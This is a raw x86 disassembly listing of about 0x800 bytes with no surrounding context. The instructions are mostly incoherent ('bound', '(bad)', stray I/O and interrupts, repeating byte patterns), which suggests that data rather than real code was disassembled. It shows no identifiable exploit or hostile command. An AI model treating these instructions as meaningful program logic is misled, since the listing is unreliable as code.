  408906:	bound  eax,QWORD PTR [eax+0x5]
  408909:	inc    ecx
  40890a:	add    BYTE PTR [ebx+0x40],al
  40890d:	inc    eax
  40890e:	inc    ecx
  40890f:	inc    eax
  408910:	inc    eax
  408911:	bound  eax,QWORD PTR ds:0x5624300
  408917:	add    BYTE PTR [eax+0x40],al
  40891a:	add    BYTE PTR [ecx+0x43],al
  40891d:	add    BYTE PTR [eax+0x41],al
  408920:	add    eax,0x40436200
  408925:	inc    eax
  408926:	add    eax,0x73f2e162
  40892b:	mov    al,0x10
  40892d:	inc    edx
  40892e:	inc    eax
  40892f:	loope  0x408950
  408931:	pop    ds
  408932:	pushf  
  408933:	add    eax,0x4640fa62
  408938:	or     al,0x45
  40893a:	dec    ecx
  40893b:	xchg   DWORD PTR [esp+edi*8+0x40],ebx
  40893f:	loope  0x408955
  408941:	enter  0x450f,0x0
  408945:	push   ss
  408946:	inc    eax
  408947:	mov    bh,0x37
  408949:	inc    ecx
  40894a:	inc    eax
  40894b:	add    eax,0x41624340
  408950:	test   BYTE PTR [eax],al
  408952:	and    eax,0x404043
  408957:	add    BYTE PTR ds:0x626210,al
  40895d:	add    eax,0x43404140
  408962:	inc    eax
  408963:	inc    ecx
  408964:	add    eax,0x10664062
  408969:	inc    ebx
  40896a:	bound  ecx,QWORD PTR [eax-0x67]
  40896d:	xor    edx,DWORD PTR [ebx-0x48]
  408970:	inc    eax
  408971:	adc    eax,0x9463680f
  408976:	cli    
  408977:	arpl   WORD PTR [eax+0x21],ax
  40897a:	xchg   edx,eax
  40897b:	inc    edx
  40897c:	dec    edi
  40897d:	add    eax,0x44406334
  408982:	and    bh,al
  408984:	or     BYTE PTR [edi-0x5fbf5660],al
  40898a:	sub    ebx,esi
  40898c:	(bad)  [ebp+ecx*1+0x41cc05a8]
  408993:	inc    eax
  408994:	add    BYTE PTR [eax],al
  408996:	add    BYTE PTR [eax+0x40],al
  408999:	inc    ebx
  40899a:	bound  eax,QWORD PTR [eax]
  40899c:	inc    eax
  40899d:	inc    eax
  40899e:	add    eax,0x62434162
  4089a3:	inc    eax
  4089a4:	js     0x4089b6
  4089a6:	inc    ecx
  4089a7:	add    eax,0x5404325
  4089ac:	bound  eax,QWORD PTR [eax+0x40]
  4089af:	inc    ecx
  4089b0:	inc    ebx
  4089b1:	inc    eax
  4089b2:	sub    eax,esi
  4089b4:	clc    
  4089b5:	push   ebp
  4089b6:	inc    ecx
  4089b7:	jnp    0x408a22
  4089b9:	inc    eax
  4089ba:	lds    esi,FWORD PTR [edx]
  4089bc:	std    
  4089bd:	or     BYTE PTR [esi-0x48],al
  4089c0:	inc    ebx
  4089c1:	inc    eax
  4089c2:	lods   eax,DWORD PTR ds:[esi]
  4089c3:	sub    ah,ch
  4089c5:	fisttp QWORD PTR [ebp+ecx*1+0x56c54062]
  4089cc:	dec    edi
  4089cd:	pop    ebx
  4089ce:	mov    al,ds:0xbf40fc42
  4089d3:	and    eax,0x436241
  4089d8:	adc    BYTE PTR [eax+0x0],al
  4089db:	add    eax,0x62410040
  4089e0:	inc    eax
  4089e1:	add    BYTE PTR [ebx-0x34],al
  4089e4:	inc    eax
  4089e5:	add    eax,0x78434040
  4089ea:	bound  eax,QWORD PTR [ecx+0x78]
  4089ed:	add    eax,0x62404043
  4089f2:	xor    ecx,DWORD PTR [edi+0x207e9808]
  4089f8:	inc    eax
  4089f9:	das    
  4089fa:	je     0x4089f6
  4089fc:	(bad)  [eax+0x614096e0]
  408a02:	repz aad 0x29
  408a05:	adc    BYTE PTR [eax+0x61c04094],ah
  408a0b:	(bad)  [esp+ebx*4-0x1bbfe980]
  408a12:	aad    0x16
  408a14:	push   ss
  408a15:	inc    edx
  408a16:	test   al,0x68
  408a18:	inc    eax
  408a19:	xor    cl,BYTE PTR [edi]
  408a1b:	repz js 0x408a5e
  408a1e:	adc    BYTE PTR [ebx+0x40],dh
  408a21:	sahf   
  408a22:	adc    eax,0x40054041
  408a27:	bound  eax,QWORD PTR [ebx+0x43]
  408a2a:	add    eax,0x62004040
  408a2f:	inc    eax
  408a30:	add    BYTE PTR [ecx+0x40],al
  408a33:	inc    ebx
  408a34:	test   BYTE PTR ds:0x58054041,ah
  408a3a:	inc    eax
  408a3b:	inc    eax
  408a3c:	bound  eax,QWORD PTR [eax+0x66]
  408a3f:	inc    ecx
  408a40:	inc    eax
  408a41:	add    eax,0x8cac8400
  408a46:	test   al,0xde
  408a48:	inc    eax
  408a49:	jo     0x408a0f
  408a4b:	arpl   WORD PTR [ebp+0x6a],ax
  408a4e:	inc    edx
  408a4f:	inc    esi
  408a50:	inc    eax
  408a51:	and    DWORD PTR [ecx+eiz*2+0x3f],edx
  408a55:	cmp    BYTE PTR [edx],al
  408a57:	fadd   DWORD PTR [eax-0xd]
  408a5a:	das    
  408a5b:	hlt    
  408a5c:	fs inc esi
  408a5e:	in     al,dx
  408a5f:	imul   eax,DWORD PTR [eax+0x61],0xcdc8b414
  408a66:	bound  edi,QWORD PTR [eax-0xaee9fc0]
  408a6c:	lds    eax,FWORD PTR [eax]
  408a6e:	add    BYTE PTR [ebx+0x40],al
  408a71:	bound  eax,QWORD PTR ds:0x25404110
  408a77:	add    ah,cl
  408a79:	inc    ebx
  408a7a:	add    eax,0x40402562
  408a7f:	add    BYTE PTR [eax+0x40],al
  408a82:	inc    ecx
  408a83:	inc    ecx
  408a84:	add    eax,0x78434025
  408a89:	bound  eax,QWORD PTR [eax-0x7c]
  408a8c:	inc    eax
  408a8d:	inc    ecx
  408a8e:	xor    BYTE PTR [esi+0x42594051],bh
  408a94:	(bad)  
  408a95:	call   0x40d63a6f
  408a9a:	xor    dl,BYTE PTR es:[eax+0x2566cd49]
  408aa1:	inc    eax
  408aa2:	mov    ds:0x11d421bb,eax
  408aa7:	les    eax,FWORD PTR ds:[eax+0x38]
  408aab:	add    al,0x56
  408aad:	cmc    
  408aae:	pushf  
  408aaf:	outs   dx,BYTE PTR ds:[esi]
  408ab0:	inc    edx
  408ab1:	inc    eax
  408ab2:	out    0x50,al
  408ab4:	mov    BYTE PTR [edx+eax*2],bh
  408ab7:	mov    esp,0xb72440f0
  408abc:	xchg   edi,eax
  408abd:	bound  eax,QWORD PTR [esi+0x66]
  408ac0:	fild   DWORD PTR [ecx+0x40]
  408ac3:	inc    eax
  408ac4:	inc    ebx
  408ac5:	int3   
  408ac6:	add    BYTE PTR ds:0x56240,al
  408acc:	inc    ebx
  408acd:	inc    eax
  408ace:	inc    eax
  408acf:	add    BYTE PTR [ecx+0x62],al
  408ad2:	bound  eax,QWORD PTR [eax]
  408ad4:	int3   
  408ad5:	inc    eax
  408ad6:	inc    ebx
  408ad7:	add    eax,0x43624041
  408adc:	adc    BYTE PTR [ecx+0x5],al
  408adf:	inc    eax
  408ae0:	inc    eax
  408ae1:	sbb    eax,0xecd11140
  408ae6:	cmp    eax,0x306140a8
  408aeb:	rol    BYTE PTR [ebp-0x54],0x67
  408aef:	adc    al,BYTE PTR [eax-0x73]
  408af2:	xor    BYTE PTR [ecx],dl
  408af4:	xchg   ebp,eax
  408af5:	inc    esi
  408af6:	retf   
  408af7:	inc    ebp
  408af8:	inc    eax
  408af9:	inc    ebx
  408afa:	push   0xffffff9e
  408afc:	imul   esp,DWORD PTR [edx+0x43],0x40051040
  408b03:	int3   
  408b04:	pop    eax
  408b05:	inc    ecx
  408b06:	inc    ebx
  408b07:	bound  eax,QWORD PTR [ecx+0x40]
  408b0a:	add    eax,0x4140
  408b0f:	and    eax,0x40400062
  408b14:	add    eax,0x84404340
  408b19:	int3   
  408b1a:	js     0x408b1c
  408b1c:	inc    ecx
  408b1d:	adc    BYTE PTR [edx+0xf],ah
  408b20:	int    0xbc
  408b22:	sti    
  408b23:	inc    eax
  408b24:	loop   0x408ad9
  408b26:	inc    eax
  408b27:	push   ecx
  408b28:	inc    eax
  408b29:	pop    cx
  408b2b:	inc    eax
  408b2c:	pusha  
  408b2d:	pop    esp
  408b2e:	jp     0x408abd
  408b30:	pushf  
  408b31:	ds gs inc eax
  408b34:	pop    ss
  408b35:	push   ebx
  408b36:	pop    bp
  408b38:	add    eax,0x62407162
  408b3d:	inc    esp
  408b3e:	cdq    
  408b3f:	imul   eax,DWORD PTR [edi+0x354063bf],0xa89170b3
  408b49:	mov    edi,0x323f406d
  408b4e:	add    BYTE PTR [eax+0x41],al
  408b51:	inc    eax
  408b52:	inc    ebx
  408b53:	bound  ax,DWORD PTR ds:0x40434100
  408b5a:	add    eax,0x40054062
  408b5f:	bound  eax,QWORD PTR [ecx+0x40]
  408b62:	inc    ebx
  408b63:	inc    eax
  408b64:	add    eax,0x25405841
  408b69:	bound  eax,QWORD PTR [eax+0x43]
  408b6c:	inc    eax
  408b6d:	adc    ah,ch
  408b6f:	pop    ebp
  408b70:	add    eax,0xe30c00bf
  408b75:	repz jmp 0x408bb4
  408b78:	leave  
  408b79:	jp     0x408bdf
  408b7b:	inc    eax
  408b7c:	cmp    al,0x2f
  408b7e:	xchg   ecx,eax
  408b7f:	inc    ebx
  408b80:	inc    esp
  408b81:	test   eax,0x6fe312f0
  408b86:	jge    0x408b0c
  408b88:	test   BYTE PTR [ecx-0x6eedbf58],dl
  408b8e:	sbb    DWORD PTR [eax-0x3d],ebp
  408b91:	mov    edi,0x46631574
  408b96:	pushf  
  408b97:	inc    ebx
  408b98:	mov    edi,0x5a40f248
  408b9d:	jno    0x408b35
  408b9f:	cmp    BYTE PTR [edi+0x216e6245],bh
  408ba5:	inc    eax
  408ba6:	inc    ecx
  408ba7:	inc    ebx
  408ba8:	inc    eax
  408ba9:	add    eax,0x43406262
  408bae:	inc    ecx
  408baf:	adc    BYTE PTR [eax],al
  408bb1:	inc    eax
  408bb2:	add    eax,0x43000562
  408bb7:	add    BYTE PTR [ecx+0x40],al
  408bba:	inc    eax
  408bbb:	add    eax,0x400062
  408bc0:	inc    ebx
  408bc1:	inc    eax
  408bc2:	js     0x408c05
  408bc4:	inc    ecx
  408bc5:	bound  eax,QWORD PTR [eax+0x56]
  408bc8:	dec    ebp
  408bc9:	loope  0x408b6c
  408bcb:	inc    ebx
  408bcc:	push   ebp
  408bcd:	inc    eax
  408bce:	out    dx,eax
  408bcf:	ror    DWORD PTR [edi+0x34284cbf],1
  408bd5:	push   cs
  408bd6:	adc    BYTE PTR [edi+0x5],ah
  408bd9:	mov    edi,0x407156a8
  408bde:	and    al,0xd3
  408be0:	lahf   
  408be1:	mov    esi,0xf846610
  408be6:	ins    BYTE PTR es:[edi],dx
  408be7:	add    DWORD PTR [edi+edi*8],ebx
  408bea:	mov    al,ds:0x55406229
  408bef:	bound  eax,QWORD PTR [eax+0x5]
  408bf2:	inc    ecx
  408bf3:	add    BYTE PTR [ebx+0x40],al
  408bf6:	inc    eax
  408bf7:	inc    ecx
  408bf8:	inc    eax
  408bf9:	inc    eax
  408bfa:	bound  eax,QWORD PTR ds:0x5624300
  408c00:	add    BYTE PTR [eax+0x40],al
  408c03:	add    BYTE PTR [ecx+0x43],al
  408c06:	add    BYTE PTR [eax+0x41],al
  408c09:	add    eax,0x40436200
  408c0e:	inc    eax
  408c0f:	add    eax,0xa8357162
  408c14:	add    eax,0x32094a63
  408c19:	je     0x408c8d
  408c1b:	inc    ebx
  408c1c:	retf   
  408c1d:	inc    eax
  408c1e:	inc    esp
  408c1f:	inc    eax
  408c20:	mov    dl,0x91
  408c22:	cwde   
  408c23:	inc    ebp
  408c24:	dec    edi
  408c25:	cmp    BYTE PTR [esi+0x2cc84414],al
  408c2b:	lock xor al,0x6d
  408c2e:	test   al,0x41
  408c30:	inc    eax
  408c31:	add    eax,0x41624340
  408c36:	test   BYTE PTR [eax],al
  408c38:	and    eax,0x404043
  408c3d:	add    BYTE PTR ds:0x626210,al
  408c43:	add    eax,0x43404140
  408c48:	inc    eax
  408c49:	inc    ecx
  408c4a:	add    eax,0x10664062
  408c4f:	inc    ebx
  408c50:	bound  eax,QWORD PTR [eax-0x60]
  408c53:	push   ecx
  408c54:	mov    ds:0x15348017,eax
  408c59:	add    eax,DWORD PTR [ebx]
  408c5b:	pop    edi
  408c5c:	in     al,dx
  408c5d:	test   al,0xc5
  408c5f:	inc    ebx
  408c60:	retf   
  408c61:	inc    eax
  408c62:	inc    eax
  408c63:	xor    eax,0xcc0512fc
  408c68:	inc    ecx
  408c69:	inc    eax
  408c6a:	add    BYTE PTR [eax],al
  408c6c:	add    BYTE PTR [eax+0x40],al
  408c6f:	inc    ebx
  408c70:	bound  eax,QWORD PTR [eax]
  408c72:	inc    eax
  408c73:	inc    eax
  408c74:	add    eax,0x62434162
  408c79:	inc    eax
  408c7a:	js     0x408c8c
  408c7c:	inc    ecx
  408c7d:	add    eax,0x5404325
  408c82:	bound  eax,QWORD PTR [eax+0x40]
  408c85:	inc    ecx
  408c86:	inc    ebx
  408c87:	dec    eax
  408c88:	fldcw  WORD PTR [eax+0x15]
  408c8b:	popa   
  408c8c:	mov    edi,0x71846fb9
  408c91:	inc    esp
  408c92:	inc    eax
  408c93:	dec    eax
  408c94:	push   ebx
  408c95:	add    bl,ah
  408c97:	ret    
  408c98:	inc    ebx
  408c99:	dec    esp
  408c9a:	adc    ch,BYTE PTR [ecx+0x40549b37]
  408ca0:	cdq    
  408ca1:	fadd   QWORD PTR [eax-0x15]
  408ca4:	dec    edi
  408ca5:	sti    
  408ca6:	stos   DWORD PTR es:[edi],eax
  408ca7:	inc    eax
  408ca8:	pop    ebp
  408ca9:	test   al,0x14
  408cab:	aaa    
  408cac:	dec    DWORD PTR [ecx+0x15ab426d]
  408cb2:	and    eax,0x436241
  408cb7:	adc    BYTE PTR [eax+0x0],al
  408cba:	add    eax,0x62410040
  408cbf:	inc    eax
  408cc0:	add    BYTE PTR [ebx-0x34],al
  408cc3:	inc    eax
  408cc4:	add    eax,0x78434040
  408cc9:	bound  eax,QWORD PTR [ecx+0x78]
  408ccc:	add    eax,0x62404043
  408cd1:	inc    eax
  408cd2:	jmp    0x408d0c
  408cd4:	xchg   esi,eax
  408cd5:	jle    0x408cc3
  408cd7:	dec    esp
  408cd8:	leave  
  408cd9:	adc    esi,DWORD PTR [edi]
  408cdb:	cdq    
  408cdc:	add    ah,BYTE PTR [edx-0x58]
  408cdf:	into   
  408ce0:	fs inc eax
  408ce2:	call   DWORD PTR [ebx-0xe]
  408ce5:	inc    ecx
  408ce6:	inc    eax
  408ce7:	add    eax,0x43436240
  408cec:	add    eax,0x62004040
  408cf1:	inc    eax
  408cf2:	add    BYTE PTR [ecx+0x40],al
  408cf5:	inc    ebx
  408cf6:	test   BYTE PTR ds:0x58054041,ah
  408cfc:	inc    eax
  408cfd:	inc    eax
  408cfe:	bound  eax,QWORD PTR [eax+0x66]
  408d01:	inc    ecx
  408d02:	inc    eax
  408d03:	add    eax,0x55126300
  408d08:	adc    DWORD PTR [esi],ecx
  408d0a:	aaa    
  408d0b:	mov    bl,0xd8
  408d0d:	sub    BYTE PTR [edi-0xbfbdeb],bh
  408d13:	push   0x2c
  408d15:	inc    ebp
  408d16:	mov    edi,0x946cb
  408d1b:	add    BYTE PTR [ebx+0x40],al
  408d1e:	bound  eax,QWORD PTR ds:0x25404110
  408d24:	add    ah,cl
  408d26:	inc    ebx
  408d27:	add    eax,0x40402562
  408d2c:	add    BYTE PTR [eax+0x40],al
  408d2f:	inc    ecx
  408d30:	inc    ecx
  408d31:	add    eax,0x78434025
  408d36:	bound  eax,QWORD PTR [eax-0x7c]
  408d39:	inc    eax
  408d3a:	inc    ecx
  408d3b:	aaa    
  408d3c:	xchg   ebx,eax
  408d3d:	jne    0x408cc6
  408d3f:	mov    edi,0xff402c49
  408d44:	push   edx
  408d45:	cmc    
  408d46:	dec    esp
  408d47:	pop    esp
  408d48:	les    ebp,FWORD PTR [eax+0x1f]
  408d4b:	push   esp
  408d4c:	jae    0x408d36
  408d4e:	xor    eax,0x4002cbd5
  408d53:	mov    eax,ds:0xcd41ba52
  408d58:	cmp    cl,cl
  408d5a:	adc    al,0x3b
  408d5c:	mov    cl,0xe5
  408d5e:	push   eax
  408d5f:	adc    DWORD PTR [eax],ecx
  408d61:	mov    ah,0x40
  408d63:	and    DWORD PTR [edi+0x4a],ebx
  408d66:	xor    BYTE PTR [eax+0x71100543],ah
  408d6c:	aad    0xf5
  408d6e:	dec    ebp
  408d6f:	or     eax,0x40404126
  408d74:	inc    ebx
  408d75:	int3   
  408d76:	add    BYTE PTR ds:0x56240,al
  408d7c:	inc    ebx
  408d7d:	inc    eax
  408d7e:	inc    eax
  408d7f:	add    BYTE PTR [ecx+0x62],al
  408d82:	bound  eax,QWORD PTR [eax]
  408d84:	int3   
  408d85:	inc    eax
  408d86:	inc    ebx
  408d87:	add    eax,0x43624041
  408d8c:	adc    BYTE PTR [ecx+0x5],al
  408d8f:	inc    eax
  408d90:	inc    edx
  408d91:	inc    eax
  408d92:	addr16 mov edi,0x10cd7b2b
  408d98:	and    DWORD PTR [ecx],ebx
  408d9a:	jl     0x408e06
  408d9c:	xchg   edx,eax
  408d9d:	mov    eax,0x4020a858
  408da2:	popa   
  408da3:	ja     0x408df2
  408da5:	or     eax,0x12911040
  408daa:	mov    edi,0x4041c542
  408daf:	mov    al,0xbf
  408db1:	inc    eax
  408db2:	inc    eax
  408db3:	sar    DWORD PTR [ebp+0x7041389d],cl
  408db9:	add    esp,eax
  408dbb:	inc    ebx
  408dbc:	or     edx,DWORD PTR [eax+0x6208c1a8]
  408dc2:	inc    ebx
  408dc3:	inc    eax
  408dc4:	adc    BYTE PTR ds:0x4158cc40,al
  408dca:	inc    ebx
  408dcb:	bound  eax,QWORD PTR [ecx+0x40]
  408dce:	add    eax,0x4140
  408dd3:	and    eax,0x40400062
  408dd8:	add    eax,0x84404340
  408ddd:	int3   
  408dde:	js     0x408de0
  408de0:	inc    ecx
  408de1:	adc    BYTE PTR [edx+0xf],ah
  408de4:	inc    eax
  408de5:	cs jno 0x408e2c
  408de8:	bound  eax,QWORD PTR ds:0x5505cb88
  408dee:	inc    eax
  408def:	xchg   esp,eax
  408df0:	cmp    eax,DWORD PTR [edi-0x5fbf409e]
  408df6:	adc    al,BYTE PTR [edi]
  408df8:	test   eax,0x4bf5f40
  408dfd:	sub    DWORD PTR [ecx],ecx
  408dff:	jl     0x408e46
  408e01:	add    BYTE PTR [eax+0x41],al
  408e04:	inc    eax
  408e05:	inc    ebx
  408e06:	bound  ax,DWORD PTR ds:0x40434100
  408e0d:	add    eax,0x40054062
  408e12:	bound  eax,QWORD PTR [ecx+0x40]
  408e15:	inc    ebx
  408e16:	inc    eax
  408e17:	add    eax,0x25405841
  408e1c:	bound  eax,QWORD PTR [eax+0x43]
  408e1f:	inc    eax
  408e20:	adc    BYTE PTR [eax+0x34],al
  408e23:	xchg   ebp,eax
  408e24:	inc    eax
  408e25:	jle    0x408e6b
  408e27:	inc    ebx
  408e28:	stos   DWORD PTR es:[edi],eax
  408e29:	inc    eax
  408e2a:	xor    al,BYTE PTR [eax+eax*2-0x1f]
  408e2e:	shl    BYTE PTR [ecx+eax*2+0x40462240],1
  408e35:	add    DWORD PTR [edi],ecx
  408e37:	xchg   ecx,eax
  408e38:	add    al,0xa0
  408e3a:	andps  xmm0,XMMWORD PTR [eax+0x21]
  408e3e:	inc    edx
  408e3f:	loop   0x408e2d
  408e41:	add    eax,0x43414067
  408e46:	inc    eax
  408e47:	add    eax,0x43406262
  408e4c:	inc    ecx
  408e4d:	adc    BYTE PTR [eax],al
  408e4f:	inc    eax
  408e50:	add    eax,0x43000562
  408e55:	add    BYTE PTR [ecx+0x40],al
  408e58:	inc    eax
  408e59:	add    eax,0x400062
  408e5e:	inc    ebx
  408e5f:	inc    eax
  408e60:	js     0x408ea3
  408e62:	inc    ecx
  408e63:	bound  eax,QWORD PTR [eax-0x28]
  408e66:	inc    eax
  408e67:	js     0x408e39
  408e69:	daa    
  408e6a:	les    eax,FWORD PTR [edi-0x1ef39abf]
  408e70:	mov    ch,0x31
  408e72:	adc    edi,DWORD PTR [edi+0x75406864]
  408e78:	inc    edx
  408e79:	xor    cl,ch
  408e7b:	mov    edi,0x41054062
  408e80:	add    BYTE PTR [ebx+0x40],al
  408e83:	inc    eax
  408e84:	inc    ecx
  408e85:	inc    eax
  408e86:	inc    eax
  408e87:	bound  eax,QWORD PTR ds:0x5624300
  408e8d:	add    BYTE PTR [eax+0x40],al
  408e90:	add    BYTE PTR [ecx+0x43],al
  408e93:	add    BYTE PTR [eax+0x41],al
  408e96:	add    eax,0x40436200
  408e9b:	inc    eax
  408e9c:	add    eax,0xd628d62
  408ea1:	(bad)  
  408ea2:	fist   WORD PTR [ebp+0x4134bf4e]
  408ea8:	inc    eax
  408ea9:	out    dx,eax
  408eaa:	jae    0x408ecc
  408eac:	xor    eax,0x14d5d42c
  408eb1:	sub    BYTE PTR [edx+0x1],al
  408eb4:	add    BYTE PTR [ecx+0x40],0x5
  408eb8:	inc    eax
  408eb9:	inc    ebx
  408eba:	bound  eax,QWORD PTR [ecx-0x7c]
  408ebd:	add    BYTE PTR ds:0x404043,ah
  408ec3:	add    BYTE PTR ds:0x626210,al
  408ec9:	add    eax,0x43404140
  408ece:	inc    eax
  408ecf:	inc    ecx
  408ed0:	add    eax,0x10664062
  408ed5:	inc    ebx
  408ed6:	(bad)  
  408ed7:	lds    ebp,FWORD PTR [edx]
  408ed9:	std    
  408eda:	inc    eax
  408edb:	cmp    ah,dl
  408edd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ede:	vpackuswb xmm6,xmm6,XMMWORD PTR [eax+ecx*1+0x410c02f3]
  408ee7:	es inc edx
  408ee9:	add    eax,0x29403840
  408eee:	and    eax,DWORD PTR [eax-0x91349d]
  408ef4:	add    eax,0x4273e850
  408ef9:	add    eax,0x4041cc
  408efe:	add    BYTE PTR [eax],al
  408f00:	inc    eax
  408f01:	inc    eax
  408f02:	inc    ebx
  408f03:	bound  eax,QWORD PTR [eax]
  408f05:	inc    eax
  408f06:	inc    eax
  408f07:	add    eax,0x62434162
  408f0c:	inc    eax
  408f0d:	js     0x408f1f
  408f0f:	inc    ecx
  408f10:	add    eax,0x5404325
  408f15:	bound  eax,QWORD PTR [eax+0x40]
  408f18:	inc    ecx
  408f19:	inc    ebx
  408f1a:	add    al,BYTE PTR [eax+0x25]
  408f1d:	jns    0x408f3d
  408f1f:	fs mov edi,0x7f0e412a
  408f25:	mov    al,0x7b
  408f27:	test   BYTE PTR [edi+0x77408610],bh
  408f2d:	jb     0x408f5d
  408f2f:	test   al,0xbf
  408f31:	mov    ah,cl
  408f33:	mov    db4,edx
  408f36:	pusha  
  408f37:	adc    ch,BYTE PTR [edx]
  408f39:	inc    ecx
  408f3a:	fs inc eax
  408f3c:	and    al,0x40
  408f3e:	mov    BYTE PTR [ebp+edx*8+0x62091167],bh
  408f45:	mov    al,0xcd
  408f47:	inc    ecx
  408f48:	leave  
  408f49:	dec    esp
  408f4a:	leave  
  408f4b:	inc    eax
  408f4c:	and    DWORD PTR ds:0x436241,esp
  408f52:	adc    BYTE PTR [eax+0x0],al
  408f55:	add    eax,0x62410040
  408f5a:	inc    eax
  408f5b:	add    BYTE PTR [ebx-0x34],al
  408f5e:	inc    eax
  408f5f:	add    eax,0x78434040
  408f64:	bound  eax,QWORD PTR [ecx+0x78]
  408f67:	add    eax,0x62404043
  408f6c:	cmovs  ebx,DWORD PTR [eax+0x14ac6826]
  408f73:	and    eax,DWORD PTR [eax+0x4d]
  408f76:	test   al,0x40
  408f78:	jp     0x408f8f
  408f7a:	inc    eax
  408f7b:	popa   
  408f7c:	adc    al,0xb5
  408f7e:	arpl   WORD PTR [eax+0x2c],ax
  408f81:	inc    edx
  408f82:	add    edi,DWORD PTR ds:0x4048ba42
  408f88:	mov    al,ds:0x7050401e
  408f8d:	dec    edi
  408f8e:	or     BYTE PTR [esi],cl
  408f90:	xor    DWORD PTR [eax],0x40054041
  408f96:	bound  eax,QWORD PTR [ebx+0x43]
  408f99:	add    eax,0x62004040
  408f9e:	inc    eax
  408f9f:	add    BYTE PTR [ecx+0x40],al
  408fa2:	inc    ebx
  408fa3:	test   BYTE PTR ds:0x58054041,ah
  408fa9:	inc    eax
  408faa:	inc    eax
  408fab:	bound  eax,QWORD PTR [eax+0x66]
  408fae:	inc    ecx
  408faf:	inc    eax
  408fb0:	add    eax,0x42771500
  408fb5:	jge    0x408ffa
  408fb7:	cli    
  408fb8:	mov    ah,0xac
  408fba:	inc    eax
  408fbb:	push   eax
  408fbc:	jg     0x408fe1
  408fbe:	mov    eax,0x120505bf
  408fc3:	jg     0x409037
  408fc5:	and    ecx,DWORD PTR ds:0x40c9cbbf
  408fcb:	push   eax
  408fcc:	inc    edx
  408fcd:	inc    esi
  408fce:	inc    edx
  408fcf:	mov    edi,0x7f144442
  408fd4:	jno    0x409002
  408fd6:	sbb    ch,BYTE PTR [eax]
  408fd8:	xchg   DWORD PTR [ecx+0x40],eax
  408fdb:	or     al,BYTE PTR [eax]
  408fdd:	add    BYTE PTR [ebx+0x40],al
  408fe0:	bound  eax,QWORD PTR ds:0x25404110
  408fe6:	add    ah,cl
  408fe8:	inc    ebx
  408fe9:	add    eax,0x40402562
  408fee:	add    BYTE PTR [eax+0x40],al
  408ff1:	inc    ecx
  408ff2:	inc    ecx
  408ff3:	add    eax,0x78434025
  408ff8:	bound  eax,QWORD PTR [eax-0x7c]
  408ffb:	inc    eax
  408ffc:	inc    ecx
  408ffd:	int    0x99
  408fff:	and    al,0x51
  409001:	fmul   QWORD PTR [edi+0x13]
  409004:	bound  eax,QWORD PTR [ecx+0x54]
  409007:	inc    esp
  409008:	inc    eax
  409009:	ins    BYTE PTR es:[edi],dx
  40900a:	sub    BYTE PTR [eax+0x2b],al
  40900d:	rol    BYTE PTR [ecx+0x11],1
  409010:	imul   esi,ecx,0xe4d0e5f
  409016:	sbb    al,0x3c
  409018:	mov    al,0x28
  40901a:	xor    BYTE PTR [eax+0x60],al
  40901d:	inc    eax
  40901e:	jp     0x9e8f53d
  409024:	and    DWORD PTR [ecx],ecx
  409026:	retf   0x3062
  409029:	(bad)  
  40902a:	adc    BYTE PTR [eax+0x58],al
  40902d:	jne    0x409054
  40902f:	inc    eax
  409030:	pop    edx
  409031:	sub    BYTE PTR [ecx+0x1f],al
  409034:	inc    ecx
  409035:	inc    eax
  409036:	inc    eax
  409037:	inc    ebx
  409038:	int3   
  409039:	add    BYTE PTR ds:0x56240,al
  40903f:	inc    ebx
  409040:	inc    eax
  409041:	inc    eax
  409042:	add    BYTE PTR [ecx+0x62],al
  409045:	bound  eax,QWORD PTR [eax]
  409047:	int3   
  409048:	inc    eax
  409049:	inc    ebx
  40904a:	add    eax,0x43624041
  40904f:	adc    BYTE PTR [ecx+0x5],al
  409052:	inc    eax
  409053:	mov    ds:0x7b208910,al
  409058:	add    BYTE PTR [eax-0x53f24ac0],0x67
  40905f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409060:	cwde   
  409061:	ret    
  409062:	adc    al,0x1f
  409064:	inc    eax
  409065:	mov    ebp,0x446d4c45
  40906a:	inc    eax
  40906b:	dec    esi
  40906c:	pop    ds
  40906d:	and    al,BYTE PTR [ebx+0x14]
  409070:	jp     0x4090db
  409072:	adc    BYTE PTR [ecx-0x38],ah
  409075:	mov    ecx,0x43625281
  40907a:	inc    eax
  40907b:	adc    BYTE PTR ds:0x4158cc40,al
  409081:	inc    ebx
  409082:	bound  eax,QWORD PTR [ecx+0x40]
  409085:	add    eax,0x4140
  40908a:	and    eax,0x40400062
  40908f:	add    eax,0x84404340
  409094:	int3   
  409095:	js     0x409097
  409097:	inc    ecx
  409098:	adc    BYTE PTR [edx+0xf],ah
  40909b:	fdiv   QWORD PTR [eax+0x3a404140]
  4090a1:	pushf  
  4090a2:	dec    ebp
  4090a3:	bound  ebx,QWORD PTR gs:[ecx]
  4090a6:	pusha  
  4090a7:	shl    BYTE PTR [eax+edi*2],1
  4090aa:	lods   al,BYTE PTR ds:[esi]
  4090ab:	(bad)  
  4090ac:	mov    ebx,0x2b032540
  4090b1:	arpl   WORD PTR [ecx],bx
  4090b3:	fsubr  DWORD PTR [eax]
  4090b5:	adc    al,BYTE PTR [edi+0x63]
  4090b8:	call   0x7e2ec105
  4090bd:	inc    eax
  4090be:	and    DWORD PTR [eax],edx
  4090c0:	add    BYTE PTR [ecx+0x3d4c35a],0x7f
  4090c7:	push   ss
  4090c8:	push   ebx
  4090c9:	ret    
  4090ca:	ins    DWORD PTR es:[edi],dx
  4090cb:	dec    edi
  4090cc:	outs   dx,BYTE PTR ds:[esi]
  4090cd:	inc    eax
  4090ce:	loop   0x4090d0
  4090d0:	inc    eax
  4090d1:	inc    ecx
  4090d2:	inc    eax
  4090d3:	inc    ebx
  4090d4:	bound  ax,DWORD PTR ds:0x40434100
  4090db:	add    eax,0x40054062
  4090e0:	bound  eax,QWORD PTR [ecx+0x40]
  4090e3:	inc    ebx
  4090e4:	inc    eax
  4090e5:	add    eax,0x25405841
  4090ea:	bound  eax,QWORD PTR [eax+0x43]
  4090ed:	inc    eax
  4090ee:	adc    BYTE PTR [ecx],bl
  4090f0:	sub    al,0xf1
  4090f2:	xchg   esp,eax
  4090f3:	inc    esp
  4090f4:	pusha  
  4090f5:	add    eax,0x3fd87060
  4090fa:	dec    eax
  4090fb:	adc    DWORD PTR [eax+eax*2+0x4b],esp
  4090ff:	add    eax,0x7b3cd216
  409104:	imul   eax,DWORD PTR [eax+eiz*4],0x20dcc318
  40910b:	mov    ah,0xa8
  40910d:	inc    eax
  40910e:	sub    eax,0xc55e9390
  409113:	adc    eax,0x65694011
  409118:	lds    ebp,FWORD PTR [eax+0x40644558]
